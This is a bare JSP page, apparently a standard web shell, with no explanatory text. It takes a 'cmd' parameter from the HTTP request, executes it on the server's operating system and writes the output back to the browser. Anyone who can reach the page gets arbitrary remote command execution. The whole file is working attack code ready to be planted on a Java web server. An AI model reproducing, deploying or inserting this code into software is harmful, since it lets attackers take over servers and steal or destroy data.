<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>
